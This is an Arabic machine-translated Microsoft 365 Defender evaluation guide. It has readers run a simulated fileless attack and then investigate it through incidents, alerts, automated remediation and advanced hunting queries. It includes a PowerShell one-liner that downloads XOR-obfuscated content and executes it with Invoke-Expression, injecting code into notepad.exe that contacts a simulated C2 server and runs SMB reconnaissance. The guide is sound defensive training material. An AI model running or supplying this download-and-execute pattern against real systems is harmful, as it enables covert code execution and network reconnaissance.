---
title: تشغيل عمليات محاكاة Microsoft 365 Defender الهجمات
description: يمكنك تشغيل عمليات محاكاة الهجمات لمشروعك التجريبي Microsoft 365 Defender لمعرفة كيفية معالجة هذه المشكلة بسرعة.
keywords: Microsoft 365 Defender محاكاة هجوم تجريبي، Microsoft 365 Defender محاكاة هجوم تجريبي، محاكاة هجوم في Microsoft 365 Defender، Microsoft 365 Defender  مشروع تجريبي، أمان عبر الإنترنت، تهديدات ثابتة متقدمة، أمان المؤسسة، الأجهزة، الجهاز، الهوية، المستخدمون، البيانات، التطبيقات، الحوادث، التحقيق التلقائي وا الإصلاح، الصيد المتقدم
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dolmont
author: DulceMontemayor
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: 18dc8158ef3c806e5dac5a01778adebc6eecc1ce
ms.sourcegitcommit: 9856f86532bdcf0befbcdbdb7c6dc6bf89fe63b5
ms.translationtype: MT
ms.contentlocale: ar-SA
ms.lasthandoff: 07/16/2021
ms.locfileid: "63571577"
---
# <a name="run-your-microsoft-365-defender-attack-simulations"></a>تشغيل عمليات محاكاة Microsoft 365 Defender الهجمات

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]


|[![التخطيط](../../media/phase-diagrams/1-planning.png)](m365d-pilot-plan.md)<br/>[التخطيط](m365d-pilot-plan.md)|[![التحضير](../../media/phase-diagrams/2-prepare.png)](prepare-m365d-eval.md)<br/>[التحضير](prepare-m365d-eval.md)|![محاكاة هجوم](../../media/phase-diagrams/3-simluate.png)<br/>محاكاة هجوم|[![إغلاق وتلخيص](../../media/phase-diagrams/4-summary.png)](m365d-pilot-close.md)<br/>[إغلاق وتلخيص](m365d-pilot-close.md)|
|--|--|--|--|
|||*أنت هنا!*||

أنت حاليا في مرحلة محاكاة الهجمات.

بعد إعداد بيئة التجربة، حان الوقت لاختبار Microsoft 365 Defender إدارة الأحداث وإمكانيات المعالجة والتحري التلقائية. سوف نساعدك على محاكاة هجوم متطورة تستفيد من التقنيات المتقدمة لإخفاءها من الكشف. يقوم هجوم تعداد جلسات كتلة رسائل الخادم المفتوحة (SMB) على وحدات التحكم بالمجال واسترداد عناوين IP الأخيرة للأجهزة الخاصة بالمستخدمين. لا تتضمن هذه الفئة من الهجمات عادة الملفات التي يتم إسقاطها على جهاز الضحيه، بل تحدث فقط في الذاكرة. فهي "تعيش خارج الأرض" باستخدام أدوات النظام والأدوات الإدارية الموجودة وتدخل التعليمات البرمجية الخاصة بها في عمليات النظام لإخفاء تنفيذها، ويسمح هذا السلوك لهم بالتجنب من الكشف والمثابرة على الجهاز.

في عملية المحاكاة هذه، يبدأ السيناريو النموذجي لدينا مع برنامج PowerShell النصي. قد يتم خداع المستخدم لتشغيل برنامج نصي. أو قد يتم تشغيل البرنامج النصي من اتصال عن بعد بكمبيوتر آخر من جهاز موبوء مسبقا، أي المهاجم الذي يحاول التنقل بشكل لاحق في الشبكة. قد يكون الكشف عن هذه البرامج النصية صعبا لأن المسؤولين غالبا ما يقوموا بتشغيل البرامج النصية عن بعد لتنفيذ أنشطة إدارية متنوعة.

![هجوم PowerShell بدون ملف مع عملية بحقن ورسم تخطيطي للهجوم على SMB](../../media/mtp/mtpdiydiagram.png)

أثناء عملية المحاكاة، يدخل الهجوم رمز shellcode في عملية تبدو غير مهيئة. يتطلب السيناريو استخدام notepad.exe. لقد اخترنا هذه العملية للمحاكاة، ولكن من المرجح أن يستهدف المهاجمون عملية نظام طويلة الأمد، مثل svchost.exe. بعد ذلك، سيتابع رمز shellcode الاتصال بخادم الأمر والتحكم (C2) الخاص بالمهاجم لتلقي إرشادات حول كيفية المتابعة. يحاول البرنامج النصي تنفيذ استعلامات الاستطلاع مقابل وحدة التحكم بالمجال (DC). تسمح الاستطلاعات للمهاجم ب الحصول على معلومات حول أحدث معلومات تسجيل دخول المستخدم. بمجرد أن يحصل المهاجمون على هذه المعلومات، يمكنهم الانتقال بشكل لاحق في الشبكة للوصول إلى حساب حساس معين

> [!IMPORTANT]
> للحصول على أفضل النتائج، اتبع إرشادات محاكاة الهجمات قدر الإمكان.

## <a name="simulation-environment-requirements"></a>متطلبات بيئة المحاكاة

بما أنك قمت بالفعل بتكوين بيئة تجريبية أثناء مرحلة الإعداد، تأكد من وجود جهازين لهذا السيناريو: جهاز اختبار وحدة تحكم المجال.

1. تحقق من تمكين المستأجر [Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).

2. تحقق من تكوين وحدة تحكم مجال الاختبار:

   - يتم تشغيل الجهاز Windows Server 2008 R2 أو إصدار أحدث.
   - وحدة التحكم بالمجال الاختبارية ل [Microsoft Defender for Identity](/azure/security-center/security-center-wdatp) وتمكين [الإدارة عن بعد](/windows-server/administration/server-manager/configure-remote-management-in-server-manager).
   - تحقق من تمكين [Microsoft Defender for Identity Microsoft Cloud App Security التكامل](/cloud-app-security/mdi-integration).
   - يتم إنشاء مستخدم اختبار على مجالك ، ولا يلزم أذونات المسؤول.

3. التحقق من تكوين الجهاز الاختباري:

   1. يتم تشغيل الجهاز Windows 10 1903 أو إصدار أحدث.

   1. تم ضم جهاز الاختبار إلى مجال الاختبار.

   1. [قم برنامج الحماية من الفيروسات لـ Windows Defender](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). إذا كنت تواجه مشكلة في تمكين برنامج الحماية من الفيروسات لـ Windows Defender، فشاهد موضوع استكشاف الأخطاء [وإصلاحها هذا](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).

   1. تحقق من أن جهاز الاختبار تم ا [متنبها إلى Microsoft Defender ل Endpoint)](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

إذا كنت تستخدم مستأجرا موجودا ونفذ مجموعات الأجهزة، فنشئ مجموعة أجهزة مخصصة لجهاز الاختبار وادفعها إلى المستوى الأعلى في تكوين UX.

## <a name="run-the-attack-scenario-simulation"></a>تشغيل محاكاة سيناريو الهجوم

لتشغيل محاكاة سيناريو الهجوم:

1. سجل دخولك إلى جهاز الاختبار باستخدام حساب المستخدم الاختباري.

2. افتح نافذة Windows PowerShell على جهاز الاختبار.

3. انسخ برنامج محاكاة البرنامج النصي التالي:

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > إذا فتحت هذا المستند على مستعرض ويب، فقد تواجه مشاكل في نسخ النص الكامل دون فقدان أحرف معينة أو إدخال فواصل حروف إضافية. قم بتنزيل هذا المستند وافتحه على Adobe Reader.

4. عند المطالبة، اللصق وتشغيل البرنامج النصي المنسوخ.

> [!NOTE]
> إذا كنت تقوم بتشغيل PowerShell باستخدام بروتوكول سطح المكتب البعيد (RDP)، فاستخدم الأمر نوع نص الحافظة في عميل RDP لأن **مفتاح CTRL-V** hotkey أو أسلوب النقر بيمين قد لا يعمل. في بعض الأحيان لن تقبل الإصدارات الأخيرة من PowerShell هذا الأسلوب، وقد تحتاج إلى النسخ إلى المفكرة في الذاكرة أولا، ونسخها في الجهاز الظاهري، ثم لصقها في PowerShell.

بعد بضع <i> ثوان،notepad.exe</i> فتحه. سيتم إدخال رمز هجوم محاكاة في notepad.exe. احتفظ بالمثيل الذي المفكرة تلقائيا مفتوحا لتجربة السيناريو الكامل.

سيحاول رمز الهجوم الذي تم محاكاته الاتصال إلى عنوان IP خارجي (محاكاة خادم C2)، ثم محاولة الاستطلاع على وحدة التحكم بالمجال من خلال SMB.

سترى رسالة معروضة على وحدة تحكم PowerShell عند اكتمال هذا البرنامج النصي.

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

لرؤية الميزة "حادث والاستجابة التلقائية" في العمل، احتفظ notepad.exe العملية مفتوحة. سترى إيقاف الاستجابة والحادث التلقائي المفكرة العملية.

## <a name="investigate-an-incident"></a>التحقيق في حادث

> [!NOTE]
> قبل أن نستعرض عملية المحاكاة هذه، شاهد الفيديو التالي لمعرفة كيف تساعدك إدارة الحوادث على جمع التنبيهات ذات الصلة معا كجزء من عملية التحقيق، حيث يمكنك العثور عليها في المدخل، وكيف يمكنها مساعدتك في عمليات الأمان:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

بالتبديل إلى طريقة عرض محلل SOC، يمكنك الآن البدء في التحقق من الهجوم في مدخل Microsoft 365 مركز الأمان.

1. افتح قائمة [Microsoft 365 في مدخل مركز](https://security.microsoft.com/incidents) الأمان من أي جهاز.

2. انتقل إلى **الأحداث** من القائمة.

    ![لقطة شاشة للحوادث كما هو موضح في Microsoft 365 الجانب الأيمن من مركز الأمان](../../media/mtp/fig1.png)

3. سيظهر الحادث الجديد للهجوم الذي تم محاكاته في قائمة انتظار الأحداث.

    ![لقطة شاشة  الانتظار للحادث](../../media/mtp/fig2.png)

### <a name="investigate-the-attack-as-a-single-incident"></a>التحقق من الهجوم كحادثة واحدة

Microsoft 365 Defender ربط التحليلات بتجميع كل التنبيهات ذات الصلة والتحريات من منتجات مختلفة في كيان حادث واحد. من خلال القيام بذلك، Microsoft 365 Defender تعرض قصة هجوم أوسع، مما يسمح لمحلل SOC بفهم التهديدات المعقدة والاستجابة لها.

ترتبط التنبيهات التي يتم إنشاؤها أثناء عملية المحاكاة هذه بالخطر نفسه، ونتيجة لذلك، يتم تجميعها تلقائيا كحادث واحد.

لعرض الحادث:

1. انتقل إلى **قائمة انتظار** الأحداث.

   ![لقطة شاشة للحوادث من قائمة التنقل](../../media/mtp/fig1.png)

2. حدد العنصر الجديد بالنقر فوق الدائرة الموجودة على الجانب الأيسر من اسم الحادث. تعرض اللوحة الجانبية معلومات إضافية حول الحادث، بما في ذلك كل التنبيهات ذات الصلة. لكل حادث اسم فريد يصفه استنادا إلى سمات التنبيهات التي يتضمنها.

   ![لقطة شاشة لصفحة الأحداث حيث يتم تجميع التنبيهات التي تم إنشاؤها أثناء عملية المحاكاة](../../media/mtp/fig4.png)

   يمكن تصفية التنبيهات التي تظهر في لوحة المعلومات استنادا إلى موارد الخدمة: Microsoft Defender for Identity و Microsoft Cloud App Security و Microsoft Defender for Endpoint و Microsoft 365 Defender و Microsoft Defender Office 365.

3. حدد **فتح صفحة الحادث** للحصول على مزيد من المعلومات حول الحادث.

   في صفحة **الحادث** ، يمكنك رؤية كل التنبيهات والمعلومات المتعلقة بالحادث. تتضمن المعلومات الكيانات والأصول التي تتضمنها التنبيهات ومصدر الكشف للتنبيهات (Microsoft Defender for Identity، الكشف التلقائي والاستجابة على النقط النهائية)، والسبب الذي يدعو إلى ربطها معا. تظهر مراجعة قائمة تنبيهات الأحداث تقدم الهجوم. من طريقة العرض هذه، يمكنك رؤية التنبيهات الفردية والتحقق منها.

   يمكنك **أيضا النقر فوق** إدارة الحادث من القائمة اليسرى، وضع علامة على الحادث، وتعيينه لنفسك، وإضافة تعليقات.

   ![لقطة شاشة لل مكان النقر فوق "إدارة الحادث"](../../media/mtp/fig5a.png)

   ![لقطة شاشة الحقول على لوحة إدارة الأحداث حيث يمكنك وضع علامة على الحادث وتعيينه لنفسك وإضافة تعليقات](../../media/mtp/fig5b.png)

### <a name="review-generated-alerts"></a>مراجعة التنبيهات التي تم إنشاؤها

دعنا نطلع على بعض التنبيهات التي تم إنشاؤها أثناء هجوم محاكاة.

> [!NOTE]
> سنتجول في بعض التنبيهات التي تم إنشاؤها أثناء الهجوم الذي تم محاكاته. استنادا إلى إصدار Windows والمنتجات Microsoft 365 Defender التي يتم تشغيلها على جهاز الاختبار، قد ترى المزيد من التنبيهات التي تظهر في ترتيب مختلف قليلا.

![لقطة شاشة للتنبيهات التي تم إنشاؤها](../../media/mtp/fig6.png)

#### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint-edr"></a>تنبيه: تم ملاحظة عملية مريبة (المصدر: Microsoft Defender لنقطة النهاية الكشف التلقائي والاستجابة على النقط النهائية)

يستخدم المهاجمون المتقدمون أساليب متطورة وخفية للمثابرة في الذاكرة والاخفاء من أدوات الكشف. إحدى التقنيات الشائعة هي العمل من داخل عملية نظام موثوق بها بدلا من أن تكون قابلة للتنفيذ ضارة، مما يجعل من الصعب على أدوات الكشف وعمليات الأمان اكتشاف التعليمات البرمجية الضارة.

للسماح لمحللين SOC بالقبض على هذه الهجمات المتقدمة، توفر أدوات استشعار الذاكرة العميقة في Microsoft Defender for Endpoint خدمتنا السحابية مع رؤية غير مسبوقة لمجموعة متنوعة من أساليب استخدام التعليمات البرمجية عبر العمليات. يوضح الشكل التالي كيفية اكتشاف Defender لنقطة النهاية وتنبيهه حول محاولة إدخال التعليمات البرمجية <i>notepad.exe. </i>

![لقطة شاشة للتنبيه لحقن تعليمات برمجية يحتمل أن تكون ضارة](../../media/mtp/fig7.png)

#### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint-edr"></a>تنبيه: السلوك غير المتوقع الذي لاحظته عملية يتم تشغيلها بدون وسيطات سطر الأوامر (المصدر: Microsoft Defender لنقطة النهاية الكشف التلقائي والاستجابة على النقط النهائية)

غالبا ما يستهدف Microsoft Defender للكشف عن نقطة النهاية السمة الأكثر شيوعا لتقنية الهجوم. يضمن هذا الأسلوب الديمومه ويرفع الشريط للمهاجمين للتبديل إلى أساليب أحدث.

نستخدم خوارزميات التعلم على نطاق واسع لإنشاء السلوك العادي للعمليات الشائعة داخل المؤسسة وعلى مستوى العالم ونراقب الحالات التي تظهر فيها هذه العمليات سلوكيات غير طبيعية. غالبا ما تشير هذه السلوكيات الشذوذية إلى أنه تم تقديم تعليمات برمجية دفينة ويتم تشغيلها في عملية أخرى موثوق بها.

بالنسبة لهذا السيناريو <i> ، تظهرnotepad.exe</i> سلوك غير طبيعي، بما في ذلك التواصل مع موقع خارجي. هذه النتيجة مستقلة عن الأسلوب المحدد المستخدم لإدخال التعليمات البرمجية الضارة وتنفيذها.

> [!NOTE]
> نظرا لأن هذا التنبيه يستند إلى نماذج التعلم الآلي التي تتطلب معالجة إضافية للخلف، فقد يستغرق الأمر بعض الوقت قبل أن ترى هذا التنبيه في المدخل.

لاحظ أن تفاصيل التنبيه تتضمن عنوان IP الخارجي، وهو مؤشر يمكنك استخدامه كمؤشر محور لتوسيع التحقيق.

حدد عنوان IP في شجرة عملية التنبيه لعرض صفحة تفاصيل عنوان IP.

![لقطة شاشة للتنبيه إلى سلوك غير متوقع بواسطة عملية يتم تشغيلها بدون وسيطات سطر الأوامر](../../media/mtp/fig8.png)

يعرض الشكل التالي صفحة تفاصيل عنوان IP المحددة (النقر فوق عنوان IP في شجرة عملية التنبيه).
![لقطة شاشة لصفحة تفاصيل عنوان IP](../../media/mtp/fig9.png)

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>تنبيه: استطلاع عنوان IP والمستخدم (SMB) (المصدر: Microsoft Defender for Identity)

يمكن تعداد البيانات باستخدام بروتوكول كتلة رسائل الخادم (SMB) المهاجمين من الحصول على أحدث معلومات تسجيل دخول المستخدم التي تساعدهم على التنقل بشكل لاحق عبر الشبكة للوصول إلى حساب حساس معين.

في عملية الكشف هذه، يتم تشغيل تنبيه عند تشغيل تعداد جلسة عمل SMB مقابل وحدة تحكم المجال.

![لقطة شاشة لتنبيه Microsoft Defender for Identity لاطلاع المستخدم وعنوان IP](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a>مراجعة المخطط الزمني للجهاز [Microsoft Defender لنقطة النهاية]

بعد استكشاف التنبيهات المختلفة في هذا الحادث، انتقل مرة أخرى إلى صفحة الحادث التي قمت بالتحري فيها سابقا. حدد علامة **التبويب** الأجهزة في صفحة الحادث لمراجعة الأجهزة المتدخلة في هذا الحادث كما هو محضر من Microsoft Defender ل Endpoint و Microsoft Defender for Identity.

حدد اسم الجهاز الذي وقع فيه الهجوم، لفتح صفحة الكيان لهذا الجهاز المحدد. في هذه الصفحة، يمكنك رؤية التنبيهات التي تم تشغيلها والأحداث ذات الصلة.

حدد علامة **التبويب** المخطط الزمني لفتح المخطط الزمني للجهاز وعرض كل الأحداث والسلوكيات التي تم ملاحظتها على الجهاز بترتيب زمني، تتقاطع مع التنبيهات التي تم رفعها.

![لقطة شاشة للم المخطط الزمني للجهاز مع السلوكيات](../../media/mtp/fig11.png)

يوفر توسيع بعض السلوكيات الأكثر إثارة للاهتمام تفاصيل مفيدة، مثل أشجار المعالجة.

على سبيل المثال، قم بالتمرير لأسفل حتى تجد حدث التنبيه الذي لاحظته عملية **مريبة**. حدد **powershell.exe** تم notepad.exe حدث معالجة أسفله، لعرض شجرة العملية الكاملة لهذا السلوك ضمن الرسم البياني **لكيانات** الحدث على الجزء الجانبي. استخدم شريط البحث للتصفية إذا لزم الأمر.

![لقطة شاشة من شجرة المعالجة للسلوك المحدد لإنشاء ملف PowerShell](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a>مراجعة معلومات المستخدم [Microsoft Cloud App Security]

في صفحة الحادث، حدد علامة **التبويب** المستخدمون لعرض قائمة المستخدمين المشاركين في الهجوم. يحتوي الجدول على معلومات إضافية حول كل مستخدم، بما في ذلك درجة أولوية **التحقيق لكل** مستخدم.

حدد اسم المستخدم لفتح صفحة ملف تعريف المستخدم حيث يمكن إجراء مزيد من التحقيق. [اقرأ المزيد حول التحقق من المستخدمين الخطرين](/cloud-app-security/tutorial-ueba#identify).

![لقطة شاشة لصفحة أمان التطبيقات على السحابة المستخدم](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a>المعالجة والتحري التلقائي

> [!NOTE]
>قبل أن نطلعك على عملية المحاكاة هذه، شاهد الفيديو التالي لمعرفة ما هو الاختبار الذاتي التلقائي، وأين يمكن العثور عليه في المدخل، وكيف يمكنه مساعدتك في عمليات الأمان:

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

انتقل مرة أخرى إلى الحادث في مدخل Microsoft 365 الأمان. تعرض **علامة التبويب** "عمليات التحقيق" في صفحة "الحادث" عمليات التحقيق التلقائية التي تم تشغيلها بواسطة Microsoft Defender for Identity و Microsoft Defender لنقطة النهاية. تعرض لقطة الشاشة أدناه فقط التحقيق التلقائي الذي يتم تشغيله بواسطة Defender for Endpoint. بشكل افتراضي، يقوم Defender for Endpoint تلقائيا بتسهيل النتائج التي تم العثور عليها في قائمة الانتظار، مما يتطلب المعالجة.

![لقطة شاشة لتحريات تلقائية ذات صلة بالحادث](../../media/mtp/fig14.png)

حدد التنبيه الذي تسبب في فتح التحقيق لفتح **صفحة تفاصيل** التحقيق. سترى التفاصيل التالية:

- التنبيه (التنبيهات) التي كانت السبب في إجراء التحقيق التلقائي.
- المستخدمون والأجهزة التي تم التأثير عليها. إذا تم العثور على مؤشرات على أجهزة إضافية، سيتم إدراج هذه الأجهزة الإضافية أيضا.
- قائمة الأدلة. الوحدات التي تم العثور عليها وتحليلها، مثل الملفات والعمليات والخدمات وبرامج التشغيل وعناوين الشبكة. يتم تحليل هذه الكيانات للحصول على علاقات محتملة بالتنبيه ويتم تصنيفها على أنها ضارة أو ضارة.
- تم العثور على التهديدات. التهديدات المعروفة التي يتم العثور عليها أثناء التحقيق.

> [!NOTE]
> استنادا إلى التوقيت، قد يكون التحقيق التلقائي لا يزال قيد التشغيل. انتظر بضع دقائق حتى تكتمل العملية قبل تجميع الأدلة وتحليلها ومراجعة النتائج. تحديث صفحة **تفاصيل التحقيق** للحصول على النتائج الأخيرة.

![لقطة شاشة لصفحة تفاصيل التحقيق](../../media/mtp/fig15.png)

أثناء عملية البحث التلقائية، حدد Microsoft Defender ل Endpoint notepad.exe العملية، التي تم إدخالها كواد من النتائج الفنية التي تتطلب المعالجة. يوقف Defender for Endpoint تلقائيا عملية المعالجة المريبة كجزء من المعالجة التلقائية.

يمكنك <i> رؤيةnotepad.exeمن </i> قائمة العمليات قيد التشغيل على جهاز الاختبار.

## <a name="resolve-the-incident"></a>حل الحادث

بعد اكتمال التحقيق وتأكيد إصلاحه، أغلق الحادث.

حدد **إدارة الحادث**. قم بتعيين الحالة إلى **حل الحادث** وحدد التصنيف ذي الصلة.

عند حل هذا الحادث، يتم إغلاق كل التنبيهات المقترنة في Microsoft 365 الأمان والمداخل ذات الصلة.

![لقطة شاشة لصفحة الأحداث مع لوحة "إدارة الأحداث" المفتوحة حيث يمكنك النقر فوق مفتاح التبديل لحل الحادث](../../media/mtp/fig16.png)

يلتف هذا الأمر مع محاكاة الهجمات لإدارة الأحداث وسيناريوهات المعالجة والتحري التلقائي. ستتحمل عملية المحاكاة التالية عملية البحث عن تهديدات استباقية لملفات يحتمل أن تكون ضارة.

## <a name="advanced-hunting-scenario"></a>سيناريو الصيد المتقدم

> [!NOTE]
> قبل أن نستعرض عملية المحاكاة، شاهد الفيديو التالي لفهم مفاهيم الصيد المتقدمة، وتعرف على المكان الذي يمكنك العثور عليه في المدخل، وتعرف كيف يمكنه مساعدتك في عمليات الأمان:

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a>متطلبات بيئة الصيد

هناك علبة بريد داخلية واحدة والجهاز المطلوب لهذا السيناريو. ستحتاج أيضا إلى حساب بريد إلكتروني خارجي لإرسال رسالة الاختبار.

1. تحقق من تمكين المستأجر [Microsoft 365 Defender.](m365d-enable.md#confirm-that-the-service-is-on)
2. تحديد علبة بريد الهدف التي يجب استخدامها لتلقي البريد الإلكتروني.
    أ. يجب مراقبة علبة البريد هذه بواسطة Microsoft Defender Office 365 b. يحتاج الجهاز من المتطلب 3 إلى الوصول إلى علبة البريد هذه
3. تكوين جهاز اختبار: أ. تأكد من أنك تستخدم الإصدار Windows 10 1903 أو الإصدارات الأحدث.
    ب. انضم إلى جهاز الاختبار إلى مجال الاختبار.
    c. [قم برنامج الحماية من الفيروسات لـ Windows Defender](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features). إذا كنت تواجه مشكلة في تمكين برنامج الحماية من الفيروسات لـ Windows Defender، فشاهد [موضوع استكشاف الأخطاء وإصلاحها هذا](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).
    د. [Onboard to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).

### <a name="run-the-simulation"></a>تشغيل المحاكاة

1. من حساب بريد إلكتروني خارجي، أرسل بريدا إلكترونيا إلى علبة البريد المحددة في الخطوة 2 من القسم متطلبات بيئة الاختبار. قم بتضمين مرفق سيتم السماح به من خلال أي من سياسات تصفية البريد الإلكتروني الموجودة. لا يلزم أن يكون هذا الملف ضارا أو قابلا للتنفيذ. أنواع الملفات <i> المقترحة.pdfأو </i><i>.exe</i> أو مستند Office مثل ملف Word.
2. افتح البريد الإلكتروني المرسل من الجهاز الذي تم تكوينه كما تم تعريفه في الخطوة 3 من القسم متطلبات بيئة الاختبار. إما أن تفتح المرفق أو احفظ الملف على الجهاز.

#### <a name="go-hunting"></a>الذهاب للصيد

1. افتح security.microsoft.com المدخل.

2. انتقل إلى **البحث > الصيد المتقدم**.

   ![لقطة شاشة للصيد المتقدم في شريط التنقل في مدخل مركز الأمان M365](../../media/mtp/fig17.png)

3. إنشاء استعلام يبدأ بجمع أحداث البريد الإلكتروني.

   1. من جزء الاستعلام، حدد جديد.

   1. انقر نقرا مزدوجا فوق الجدول EmailEvents من المخطط.

      ```console
      EmailEvents
      ```

   1. تغيير الإطار الزمني إلى آخر 24 ساعة. بافتراض أن البريد الإلكتروني الذي أرسلته عند إجراء المحاكاة أعلاه كان في ال 24 ساعة الماضية، وبخلاف ذلك غير الإطار الزمني.

      ![لقطة شاشة للتي يمكنك تغيير الإطار الزمني فيها. فتح القائمة المنسدلة للاختيار من بين نطاق خيارات الإطار الزمني](../../media/mtp/fig18.png)

   1. تشغيل الاستعلام. قد يكون لديك العديد من النتائج استنادا إلى بيئة النموذج التجريبي.

      > [!NOTE]
      > راجع الخطوة التالية للحصول على خيارات التصفية للحد من إرجاع البيانات.

      ![لقطة شاشة لنتائج استعلام البحث المتقدم](../../media/mtp/fig19.png)

        > [!NOTE]
        > يعرض البحث المتقدم نتائج الاستعلام كالبيانات الجدولية. يمكنك أيضا اختيار عرض البيانات بأنواع تنسيقات أخرى مثل المخططات.

   1. أطلع على النتائج وتعرف على ما إذا كان بإمكانك تحديد البريد الإلكتروني الذي فتحته. قد يستغرق الأمر ساعتين حتى تظهر الرسالة في عملية البحث المتقدم. إذا كانت بيئة البريد الإلكتروني كبيرة وظهرت نتائج كثيرة، فقد تحتاج إلى استخدام الخيار إظهار **عوامل** التصفية للعثور على الرسالة.

      في العينة، تم إرسال البريد الإلكتروني من حساب Yahoo. انقر فوق **+** الأيقونة **yahoo.com** أسفل المقطع SenderFromDomain، ثم انقر فوق تطبيق لإضافة  المجال المحدد إلى الاستعلام. استخدم حساب المجال أو البريد الإلكتروني الذي تم استخدامه لإرسال رسالة الاختبار في الخطوة 1 من تشغيل المحاكاة لتصفية النتائج. قم بتشغيل الاستعلام مرة أخرى للحصول على مجموعة نتائج أصغر للتحقق من رؤية الرسالة من عملية المحاكاة.

      ![لقطة شاشة ل عوامل التصفية. استخدم عوامل التصفية لتضييق نطاق البحث والعثور على ما تبحث عنه بشكل أسرع.](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. انقر فوق الصفوف الناتجة من الاستعلام حتى تتمكن من فحص السجل.

      ![لقطة شاشة للوحة فحص السجلات الجانبية التي تفتح عند تحديد نتيجة عملية صيد متقدمة](../../media/mtp/fig21.png)

4. الآن وقد قمت بالتحقق من أنه يمكنك رؤية البريد الإلكتروني، أضف عامل تصفية للمرفقات. ركز على كل رسائل البريد الإلكتروني التي بها مرفقات في البيئة. بالنسبة لهذا السيناريو، ركز على رسائل البريد الإلكتروني الواردة، وليس تلك التي يتم إرسالها من بيئتك. قم بإزالة أي عوامل تصفية أضفتها لتحديد موقع رسالتك وإضافة "| حيث **يكون عدد المرفقات > 0** و **EmailDirection** ==  **"Inbound""**

   سيعرض لك الاستعلام التالي النتيجة مع قائمة أقصر من الاستعلام الأولي لكل أحداث البريد الإلكتروني:

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. بعد ذلك، قم بتضمين معلومات حول المرفق (مثل: اسم الملف، هازه) إلى مجموعة النتائج. للقيام بذلك، انضم إلى **الجدول EmailAttachmentInfo** . الحقول الشائعة التي يجب استخدامها للانضمام، في هذه الحالة هي **NetworkMessageId** و **RecipientObjectId**.

   يتضمن الاستعلام التالي أيضا سطرا إضافيا "| **إعادة تسمية البريد الإلكترونيTimestamp=Timestamp**" التي ستساعد على تحديد أي من الampsstamp كان مرتبطا بالبريد الإلكتروني مقابل الamps الزمنية ذات الصلة ب إجراءات الملفات التي ستنضافها في الخطوة التالية.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. بعد ذلك، استخدم القيمة **SHA256** من الجدول **EmailAttachmentInfo** للعثور على **DeviceFileEvents** (إجراءات الملف التي حدثت في نقطة النهاية) لذلك العثرة. سيكون الحقل المشترك هنا هو شارة SHA256 للمرفق.

   يتضمن الجدول الناتج الآن تفاصيل من نقطة النهاية (Microsoft Defender لنقطة النهاية) مثل اسم الجهاز، وما الإجراء الذي تم اتخاذه (في هذه الحالة، تمت تصفيته لتضمين أحداث FileCreated فقط)، وحيث تم تخزين الملف. سيتم أيضا تضمين اسم الحساب المقترن بهذه العملية.

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   لقد أنشأت الآن استعلاما سيحدد كل رسائل البريد الإلكتروني الواردة حيث قام المستخدم بفتح المرفق أو حفظه. يمكنك أيضا تحسين هذا الاستعلام للتصفية لمجالات مرسلين محددة، أحجام الملفات، أنواع الملفات، وما إلى ذلك.

7. الدالات هي نوع خاص من الصلة، مما يمكنك من سحب المزيد من بيانات TI حول ملف مثل نقله، ومعلومات عن موقعه ومصدره، وما إلى ذلك. للحصول على مزيد من التفاصيل حول الملف، استخدم إثراء الدالة **FileProfile()** :

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
